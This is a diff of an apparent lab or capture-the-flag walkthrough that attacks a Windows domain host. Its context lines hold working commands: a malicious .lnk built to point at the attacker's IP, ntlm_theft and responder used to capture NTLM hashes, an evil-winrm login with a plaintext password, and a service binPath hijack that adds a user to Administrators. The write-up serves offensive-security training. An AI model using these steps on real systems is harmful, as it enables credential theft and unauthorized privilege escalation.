@@ -120,7 +120,7 @@ There is a good article [here](https://www.acronis.com/en/tru/posts/using-lnk-fi
 
 We have few different options for generating a valid Windows binary shortcut. The most surefire way is to generate one in PowerShell on an available Windows host. Or we can use a Python script on our attack box, which works just as well.
 
-### PowerShell Method
+***PowerShell .lnk creation***
 
 We will need to change `$lnk.TargetPath` to our attack box VPN IP, the leading `@pwn.png` is just a pointer and does not need to exist on our share itself; It simply indicates a target path. Set `$objShell.CreateShortcut` to where we would like the .lnk saved.
 
@@ -136,7 +136,7 @@ $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
 ```
 
-### Python Method
+***Python .lnk creation***
 
 - [GitHub — dievus/lnkbomb: Malicious shortcut generator](https://github.com/dievus/lnkbomb)
 
@@ -146,8 +146,6 @@ This script is quite handy and can generate a large number of different files fo
 ```bash
 $ python ntlm_theft/ntlm_theft.py --generate lnk --server 192.168.45.249 --filename legit
 ```
-
----
 
 Once the file is ready (either method), fire up responder.
 ```bash
@@ -246,6 +244,7 @@ $ evil-winrm-py -i 192.168.228.172 -u anirudh -p 'SecureHM'
 
 On our initial enumeration we’ll find that the controlled user **anirudh** is a member of the **Server Operators** group, as well as some other dangerous privileges we could exploit to get the system. While server operators are not technically domain admins, they hold near-equivalent privileges over Active Directory domain controllers and should be treated as such.
 ![](73904f24737dd1c9639e9fedf21d8433.png)
+
 We can exploit the **Server Operators** group by perform a service binary path hijacking attack. By reconfiguring the **AppReadiness** service to execute a command, we can add **anirudh** to the local **Administrators** group.
 ```powershell
 PS C:\Users\anirudh\Documents> sc.exe config AppReadiness binPath= "cmd.exe /c net localgroup administrators anirudh /add"
